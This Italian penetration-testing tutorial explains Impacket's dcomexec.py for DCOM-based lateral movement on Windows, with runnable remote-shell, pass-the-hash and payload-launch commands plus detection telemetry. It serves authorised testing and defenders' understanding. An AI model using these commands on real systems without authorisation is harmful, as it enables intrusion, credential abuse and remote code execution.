---
title: dcomexec.py - Lateral Movement via DCOM con Impacket
slug: dcomexec
description: 'Guida operativa a impacket-dcomexec: esecuzione remota su Windows via DCOM con ShellWindows, ShellBrowserWindow e MMC20 usando password o hash NTLM.'
image: /dcomexec-py-lateral-movement-dcom.webp
draft: true
date: 2026-07-22T00:00:00.000Z
categories:
  - tools
subcategories:
  - post-exploit
tags:
  - impacket
  - dcom
  - remote-execution
  - lateral-movement
---

# Impacket dcomexec: Esecuzione Remota e Lateral Movement via DCOM

`dcomexec.py` esegue comandi su host Windows remoti attraverso oggetti DCOM come `ShellWindows`, `ShellBrowserWindow` e `MMC20.Application`. Supporta password e hash NTLM, può eseguire un singolo comando o aprire una shell semi-interattiva e non crea servizi o scheduled task. Richiede TCP 135 e una porta RPC dinamica; TCP 445 è necessario soltanto per recuperare l’output tramite una share amministrativa.

`dcomexec.py` fa parte di [Impacket](https://hackita.it/articoli/impacket/) ed è uno strumento di lateral movement per ambienti Windows e Active Directory.

A differenza di `psexec.py` e `smbexec.py`, non crea un servizio remoto. A differenza di [atexec.py](https://hackita.it/articoli/atexec/), non utilizza il Task Scheduler. L’esecuzione avviene attivando un oggetto COM remoto attraverso DCOM e richiamando i metodi esposti dall’oggetto selezionato.

La tecnica è stata documentata originariamente da Matt Nelson nel 2017 attraverso l’abuso remoto di `MMC20.Application` e di altri oggetti COM.

Riferimenti:

* [Fortra Impacket — dcomexec.py](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py)
* [Lateral Movement Using the MMC20.Application COM Object](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [MITRE ATT\&CK T1021.003 — Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003/)

***

## Come Funziona dcomexec.py

Il flusso operativo è il seguente:

```text
1. Connessione al target tramite RPC Endpoint Mapper su TCP 135
2. Risoluzione di una porta RPC dinamica
3. Autenticazione NTLM con password o NT hash
4. Attivazione remota dell’oggetto DCOM selezionato
5. Invocazione del metodo che avvia il comando
6. Eventuale redirezione dell’output verso una share locale del target
7. Recupero e cancellazione dell’output tramite SMB
```

Se l’output è abilitato, Impacket redirige `stdout` e `stderr` verso un file temporaneo nella share configurata:

```text
\\127.0.0.1\ADMIN$\__<valore>
```

Con la share predefinita `ADMIN$`, il file viene quindi creato nella directory `%SystemRoot%`, normalmente `C:\Windows`, e cancellato dopo la lettura.

Con `-nooutput` o `-silentcommand`, la connessione SMB dedicata al recupero dell’output non viene creata.

***

## Oggetti DCOM Supportati

| Oggetto              | CLSID                                  | Metodo utilizzato     | Note                                  |
| -------------------- | -------------------------------------- | --------------------- | ------------------------------------- |
| `ShellWindows`       | `9BA05972-F6A8-11CF-A442-00A0C90A8F39` | `ShellExecute`        | Oggetto predefinito                   |
| `ShellBrowserWindow` | `C08AFD90-F2A1-11D1-8455-00A0C91F3880` | `ShellExecute`        | Alternativa basata su Windows Shell   |
| `MMC20`              | `49B2791A-B1AE-4C90-9B8E-E860BA07F889` | `ExecuteShellCommand` | Utilizza Microsoft Management Console |

Il repository ufficiale riporta test storici su Windows 7, Windows 10 e Windows Server 2012 R2. Il funzionamento sulle versioni più recenti dipende dalla build, dalla configurazione DCOM e dalle policy di sicurezza del target.

Non esiste un oggetto universalmente migliore:

```text
ShellWindows        → oggetto predefinito
MMC20               → alternativa tramite Microsoft Management Console
ShellBrowserWindow  → alternativa da verificare sulla build target
```

***

## Confronto con gli Altri Tool Impacket

| Tool          | Meccanismo              | Porte                              | Artefatti principali                           | Tipo di accesso        |
| ------------- | ----------------------- | ---------------------------------- | ---------------------------------------------- | ---------------------- |
| `dcomexec.py` | DCOM/RPC                | 135 + RPC dinamica; 445 opzionale  | Attivazione COM e processi remoti              | Shell semi-interattiva |
| `wmiexec.py`  | WMI/DCOM                | 135 + RPC dinamica; 445 per output | `WmiPrvSE.exe`, processo remoto e file output  | Shell semi-interattiva |
| `atexec.py`   | Task Scheduler RPC      | 445                                | Creazione ed eliminazione di un scheduled task | Comando singolo        |
| `smbexec.py`  | Service Control Manager | 445                                | Servizio temporaneo e file batch               | Shell semi-interattiva |
| `psexec.py`   | Servizio remoto         | 445                                | Servizio e binario remoto                      | Shell interattiva      |

Per un confronto più ampio puoi consultare:

* [wmiexec.py](https://hackita.it/articoli/wmiexec/)
* [smbexec.py](https://hackita.it/articoli/smbexec/)

***

## Sintassi

```bash
impacket-dcomexec [opzioni] 'DOMINIO/utente:password@TARGET' [comando]
```

Se il comando viene omesso, viene avviata una shell semi-interattiva:

```bash
impacket-dcomexec 'corp.local/administrator:Password123!@10.10.10.5'
```

***

## Opzioni Principali

| Opzione                 | Descrizione                                                              |
| ----------------------- | ------------------------------------------------------------------------ |
| `-object`               | Seleziona `ShellWindows`, `ShellBrowserWindow` o `MMC20`                 |
| `-shell-type`           | Usa `cmd` oppure `powershell` nella shell semi-interattiva               |
| `-hashes LMHASH:NTHASH` | Autenticazione Pass-the-Hash                                             |
| `-nooutput`             | Non recupera l’output e non crea la connessione SMB dedicata             |
| `-silentcommand`        | Esegue direttamente il programma senza avviare automaticamente `cmd.exe` |
| `-share`                | Share utilizzata per recuperare l’output; default `ADMIN$`               |
| `-com-version`          | Imposta la versione DCOM, per esempio `5.7`                              |
| `-codec`                | Imposta la codifica usata per decodificare l’output remoto               |
| `-A`                    | Carica credenziali da un file in formato `smbclient`                     |
| `-ts`                   | Aggiunge timestamp ai messaggi del tool                                  |
| `-debug`                | Mostra informazioni di debug                                             |

### Formato corretto di `-com-version`

```bash
impacket-dcomexec -com-version 5.7 \
  'corp.local/administrator:Password123!@10.10.10.5' \
  'whoami'
```

Il separatore è un punto:

```text
5.7
```

non:

```text
5:7
```

***

## Kerberos: Non Supportato nella Versione Corrente

La versione corrente di `dcomexec.py` espone ancora alcuni parametri Kerberos nel parser, ma interrompe l’esecuzione quando vengono utilizzati:

```text
-k
-aesKey
-keytab
```

Gli oggetti `ShellWindows`, `ShellBrowserWindow` e `MMC20` vengono ospitati nel contesto utente e non accettano i normali ticket Kerberos `HOST/<target>` utilizzati dagli altri tool Impacket.

Questi comandi non funzionano con l’implementazione corrente:

```bash
impacket-dcomexec -k -no-pass corp.local/admin@server.corp.local
impacket-dcomexec -aesKey AES_KEY corp.local/admin@server.corp.local
```

Per esecuzione remota tramite ticket Kerberos utilizza invece:

```bash
export KRB5CCNAME=administrator.ccache

impacket-wmiexec -k -no-pass \
  corp.local/administrator@server.corp.local
```

***

## Shell Semi-Interattiva

### Oggetto predefinito: ShellWindows

```bash
impacket-dcomexec \
  'corp.local/administrator:Password123!@10.10.10.5'
```

### MMC20

```bash
impacket-dcomexec -object MMC20 \
  'corp.local/administrator:Password123!@10.10.10.5'
```

### ShellBrowserWindow

```bash
impacket-dcomexec -object ShellBrowserWindow \
  'corp.local/administrator:Password123!@10.10.10.5'
```

### Shell PowerShell

```bash
impacket-dcomexec -shell-type powershell \
  'corp.local/administrator:Password123!@10.10.10.5'
```

La shell è semi-interattiva: ogni comando viene eseguito separatamente sul target e l’output viene recuperato tramite la share configurata.

Comandi locali disponibili nella shell:

```text
lcd PATH      cambia la directory locale
lput FILE     carica un file sul target
lget FILE     scarica un file dal target
! COMANDO     esegue un comando sul sistema locale
exit          chiude la sessione
```

Le funzioni `lput` e `lget` richiedono una connessione SMB funzionante.

***

## Esecuzione di un Singolo Comando

```bash
impacket-dcomexec \
  'corp.local/administrator:Password123!@10.10.10.5' \
  'whoami'
```

```bash
impacket-dcomexec \
  'corp.local/administrator:Password123!@10.10.10.5' \
  'whoami /all'
```

```bash
impacket-dcomexec \
  'corp.local/administrator:Password123!@10.10.10.5' \
  'ipconfig /all'
```

```bash
impacket-dcomexec \
  'corp.local/administrator:Password123!@10.10.10.5' \
  'net group "Domain Admins" /domain'
```

```bash
impacket-dcomexec \
  'corp.local/administrator:Password123!@10.10.10.5' \
  'tasklist /v'
```

***

## Pass-the-Hash

`dcomexec.py` supporta l’autenticazione NTLM tramite NT hash.

### Solo NT hash

```bash
impacket-dcomexec -hashes :NTHASH \
  'corp.local/administrator@10.10.10.5'
```

### LM hash e NT hash

```bash
impacket-dcomexec \
  -hashes aad3b435b51404eeaad3b435b51404ee:NTHASH \
  'corp.local/administrator@10.10.10.5' \
  'whoami'
```

Gli hash possono essere recuperati durante un assessment autorizzato con strumenti come:

* [Mimikatz](https://hackita.it/articoli/mimikatz/)
* [secretsdump.py](https://hackita.it/articoli/secretsdump/)

***

## Autenticazione con File

Puoi evitare di inserire le credenziali direttamente nella command line utilizzando un file compatibile con `smbclient`:

```text
username=administrator
password=Password123!
domain=corp.local
```

Esecuzione:

```bash
impacket-dcomexec -A credentials.conf \
  10.10.10.5 \
  'whoami'
```

Il file contiene comunque credenziali sensibili e deve essere protetto e rimosso al termine del test.

***

## `-nooutput`

`-nooutput` esegue il comando tramite la normale shell selezionata, ma non recupera il risultato e non crea la connessione SMB utilizzata per leggere il file di output.

```bash
impacket-dcomexec -nooutput \
  'corp.local/administrator:Password123!@10.10.10.5' \
  'whoami'
```

Può essere utile quando:

* il comando non produce output necessario;
* TCP 445 è bloccato;
* `ADMIN$` non è accessibile;
* il risultato viene scritto altrove;
* viene avviato un processo indipendente.

`-nooutput` non può essere utilizzato per aprire una shell semi-interattiva:

```bash
# Non supportato
impacket-dcomexec -nooutput \
  'corp.local/administrator:Password123!@10.10.10.5'
```

***

## `-silentcommand`

`-silentcommand` non esegue automaticamente `cmd.exe`.

Il primo elemento viene interpretato come programma e il resto come argomenti. Non puoi quindi utilizzare direttamente:

* `dir`;
* `cd`;
* pipe;
* redirect;
* `&&`;
* altri built-in di `cmd.exe`.

Esecuzione diretta di un programma:

```bash
impacket-dcomexec -silentcommand \
  'corp.local/administrator:Password123!@10.10.10.5' \
  'C:\Windows\System32\whoami.exe /all'
```

Per eseguire comandi composti devi richiamare esplicitamente `cmd.exe`:

```bash
impacket-dcomexec -silentcommand \
  'corp.local/administrator:Password123!@10.10.10.5' \
  'cmd.exe /c whoami && hostname'
```

Esecuzione di un payload già presente sul target:

```bash
impacket-dcomexec -silentcommand \
  'corp.local/administrator:Password123!@10.10.10.5' \
  'cmd.exe /c start /b C:\Windows\Temp\payload.exe'
```

Come `-nooutput`, `-silentcommand` non supporta la shell semi-interattiva.

***

## Autenticazione con Account Locale

```bash
impacket-dcomexec -object MMC20 \
  './administrator:Password123!@10.10.10.5'
```

In alcuni ambienti, i filtri UAC applicati agli account locali possono limitare l’amministrazione remota anche quando l’utente appartiene al gruppo Administrators.

***

## Requisiti

```text
- Password valida oppure NT hash
- TCP 135 raggiungibile
- Porta RPC dinamica raggiungibile
- DCOM remoto consentito
- Permessi di Remote Launch e Remote Activation sull’oggetto
- TCP 445 e una share accessibile soltanto per recuperare l’output
```

Sui sistemi Windows moderni, le porte RPC dinamiche utilizzano normalmente il range:

```text
49152–65535/TCP
```

Il range può essere ristretto o personalizzato dagli amministratori.

In configurazioni standard è normalmente necessario essere amministratore locale sul target. Tuttavia, permessi DCOM specifici possono essere delegati anche ad altri utenti o gruppi.

***

## Quando Usare dcomexec.py

`dcomexec.py` è una buona scelta quando:

* TCP 135 e le porte RPC dinamiche sono raggiungibili;
* possiedi una password o un NT hash;
* vuoi evitare la creazione di servizi;
* vuoi evitare il Task Scheduler;
* ti serve una shell semi-interattiva;
* vuoi scegliere tra più oggetti DCOM;
* puoi recuperare l’output tramite SMB oppure usare `-nooutput`.

Non è la scelta adatta quando:

* possiedi soltanto un ticket Kerberos;
* TCP 135 o le porte RPC dinamiche sono bloccate;
* hai soltanto TCP 445 disponibile;
* ti serve una shell realmente interattiva;
* l’attivazione DCOM remota è disabilitata.

Mappa rapida:

```text
Solo TCP 445
└── atexec.py, smbexec.py o psexec.py

TCP 135 + RPC dinamiche
└── dcomexec.py o wmiexec.py

Nessun accesso a TCP 445
└── dcomexec.py -nooutput oppure -silentcommand

Ticket Kerberos
└── wmiexec.py -k, non dcomexec.py

Serve output
└── TCP 445 + share ADMIN$ o share alternativa

Non serve output
└── -nooutput oppure -silentcommand
```

***

## Errori Comuni e Troubleshooting

| Errore                       | Possibile causa                         | Soluzione                                                  |
| ---------------------------- | --------------------------------------- | ---------------------------------------------------------- |
| `0x80070005` / Access Denied | Privilegi o permessi DCOM insufficienti | Verifica amministrazione locale e Remote Launch/Activation |
| Timeout dopo TCP 135         | Porta RPC dinamica bloccata             | Controlla firewall e range RPC                             |
| `STATUS_LOGON_FAILURE`       | Password o hash errato                  | Verifica dominio, username e credenziale                   |
| `STATUS_BAD_NETWORK_NAME`    | Share di output non disponibile         | Usa `-nooutput` o specifica una share valida               |
| Output vuoto                 | Problema con share, comando o codifica  | Usa `-debug`, verifica `ADMIN$` e prova `-codec`           |
| Errore di decodifica         | Code page remota differente             | Esegui `chcp` e configura `-codec`                         |
| Oggetto DCOM non disponibile | Incompatibilità o configurazione target | Prova un altro valore di `-object`                         |
| RPC runtime error            | DCOM bloccato o problemi di rete        | Verifica TCP 135, porte dinamiche e policy DCOM            |
| Kerberos non supportato      | Uso di `-k`, `-aesKey` o `-keytab`      | Utilizza password/hash NTLM o passa a `wmiexec.py -k`      |

### Verificare le porte

```bash
nmap -Pn -p 135,445 10.10.10.5
```

La porta dinamica viene assegnata attraverso RPC Endpoint Mapper e può cambiare a ogni connessione.

### Debug

```bash
impacket-dcomexec -debug \
  'corp.local/administrator:Password123!@10.10.10.5' \
  'whoami'
```

### Problemi di codifica

Sul target:

```cmd
chcp
```

Poi:

```bash
impacket-dcomexec -codec cp850 \
  'corp.local/administrator:Password123!@10.10.10.5' \
  'whoami'
```

La codifica corretta dipende dalla code page restituita dal target.

***

## Artefatti e OPSEC

`dcomexec.py` non crea servizi o scheduled task, ma non è invisibile.

Artefatti principali:

* connessione RPC iniziale verso TCP 135;
* successiva connessione verso una porta RPC dinamica;
* autenticazione NTLM;
* attivazione remota di un oggetto COM;
* creazione di processi tramite l’oggetto selezionato;
* connessione SMB opzionale verso TCP 445;
* file di output temporaneo nella share selezionata;
* cancellazione del file dopo il recupero.

Con `ShellWindows` e `ShellBrowserWindow` possono essere osservati processi avviati da componenti della Windows Shell. Con `MMC20` possono essere osservate catene di processo associate a `mmc.exe`. Il comportamento preciso dipende dalla versione e dalla configurazione di Windows.

`-nooutput` elimina il recupero del file tramite SMB, ma non elimina:

* traffico DCOM;
* autenticazione remota;
* attivazione COM;
* creazione del processo;
* command line sul target.

***

## Telemetria Essenziale

| Fonte         | Indicatore                                                |
| ------------- | --------------------------------------------------------- |
| Network       | TCP 135 seguito da una connessione RPC dinamica           |
| Security 4624 | Logon remoto proveniente da un host insolito              |
| Security 4688 | Creazione di `cmd.exe`, `powershell.exe` o altri processi |
| Sysmon 1      | Process creation con parent e command line anomali        |
| Sysmon 3      | Connessioni RPC/DCOM e SMB correlate                      |
| EDR           | Attivazione COM remota seguita da esecuzione di processi  |
| File system   | File temporaneo nella root della share usata per l’output |

L’evento 4648 non è garantito sul target per ogni esecuzione e non deve essere utilizzato come unico indicatore.

Il pattern più utile è la correlazione tra:

```text
invocazione DCOM remota tramite RPC
        ↓
attivazione dell’oggetto COM
        ↓
creazione anomala di un processo
        ↓
eventuale recupero dell’output via SMB
```

***

## Cheat Sheet

```bash
# Shell semi-interattiva con oggetto predefinito
impacket-dcomexec \
  'DOMAIN/user:password@TARGET'

# MMC20
impacket-dcomexec -object MMC20 \
  'DOMAIN/user:password@TARGET'

# ShellBrowserWindow
impacket-dcomexec -object ShellBrowserWindow \
  'DOMAIN/user:password@TARGET'

# Shell PowerShell
impacket-dcomexec -shell-type powershell \
  'DOMAIN/user:password@TARGET'

# Singolo comando
impacket-dcomexec \
  'DOMAIN/user:password@TARGET' \
  'whoami /all'

# Pass-the-Hash
impacket-dcomexec -hashes :NTHASH \
  'DOMAIN/user@TARGET'

# Nessun recupero output
impacket-dcomexec -nooutput \
  'DOMAIN/user:password@TARGET' \
  'whoami'

# Esecuzione diretta senza cmd.exe
impacket-dcomexec -silentcommand \
  'DOMAIN/user:password@TARGET' \
  'C:\Windows\System32\whoami.exe /all'

# Comando composto con silentcommand
impacket-dcomexec -silentcommand \
  'DOMAIN/user:password@TARGET' \
  'cmd.exe /c whoami && hostname'

# Versione DCOM
impacket-dcomexec -com-version 5.7 \
  'DOMAIN/user:password@TARGET' \
  'whoami'

# Share alternativa per output
impacket-dcomexec -share C$ \
  'DOMAIN/user:password@TARGET' \
  'whoami'

# Debug
impacket-dcomexec -debug \
  'DOMAIN/user:password@TARGET' \
  'whoami'

# Account locale
impacket-dcomexec -object MMC20 \
  './administrator:password@TARGET'
```

***

## Articoli Correlati

* [Impacket: suite completa](https://hackita.it/articoli/impacket/)
* [atexec.py: esecuzione via Task Scheduler](https://hackita.it/articoli/atexec/)
* [wmiexec.py: esecuzione remota via WMI](https://hackita.it/articoli/wmiexec/)
* [smbexec.py: esecuzione remota via SMB](https://hackita.it/articoli/smbexec/)
* [PSExec, SMBExec e WMIExec](https://hackita.it/articoli/smbexec-psexec-wmiexec/)
* [Mimikatz: estrazione delle credenziali](https://hackita.it/articoli/mimikatz/)
* [secretsdump.py con Impacket](https://hackita.it/articoli/secretsdump/)
* [Active Directory: guida offensiva](https://hackita.it/articoli/active-directory/)

***

> Tutti i comandi devono essere utilizzati esclusivamente in laboratori, infrastrutture proprie o sistemi per i quali si dispone di un’autorizzazione esplicita.
